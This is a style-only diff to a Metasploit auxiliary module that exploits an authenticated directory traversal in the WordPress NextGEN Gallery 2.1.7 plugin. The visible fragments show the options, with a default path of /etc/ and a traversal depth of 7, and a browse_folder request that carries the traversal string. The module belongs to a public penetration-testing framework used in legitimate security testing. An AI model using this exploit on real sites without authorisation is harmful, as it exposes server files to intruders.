@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,31 +9,29 @@ require 'json'
 require 'nokogiri'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'WordPress NextGEN Gallery Directory Read Vulnerability',
-      'Description'    => %q{
-        This module exploits an authenticated directory traversal vulnerability
-        in WordPress Plugin "NextGEN Gallery" version 2.1.7, allowing
-        to read arbitrary directories with the web server privileges.
-      },
-      'References'     =>
-        [
-          ['WPVDB', '8165'],
-          ['URL', 'http://permalink.gmane.org/gmane.comp.security.oss.general/17650']
-        ],
-      'Author'         =>
-        [
-          'Sathish Kumar', # Vulnerability Discovery
-          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
-        ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'WordPress NextGEN Gallery Directory Read Vulnerability',
+                      'Description'    => %q(
+                        This module exploits an authenticated directory traversal vulnerability
+                        in WordPress Plugin "NextGEN Gallery" version 2.1.7, allowing
+                        to read arbitrary directories with the web server privileges.
+                      ),
+                      'References'     =>
+                        [
+                          ['WPVDB', '8165'],
+                          ['URL', 'http://permalink.gmane.org/gmane.comp.security.oss.general/17650']
+                        ],
+                      'Author'         =>
+                        [
+                          'Sathish Kumar', # Vulnerability Discovery
+                          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
+                        ],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
@@ -40,7 +39,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
         OptString.new('DIRPATH', [true, 'The path to the directory to read', '/etc/']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def user
@@ -119,15 +119,15 @@ class MetasploitModule < Msf::Auxiliary
         'Referer' => "http://#{rhost}/wordpress/wp-admin/admin.php?page=ngg_addgallery",
         'X-Requested-With' => 'XMLHttpRequest'
       },
-      'vars_get'  => {
+      'vars_get' => {
         'photocrati_ajax' => '1'
       },
       'vars_post' => {
-        'nextgen_upload_image_sec' => "#{nonce}",
+        'nextgen_upload_image_sec' => nonce.to_s,
         'action' => 'browse_folder',
         'dir' => "#{traversal}#{filename}"
       },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
     if res && res.code == 200
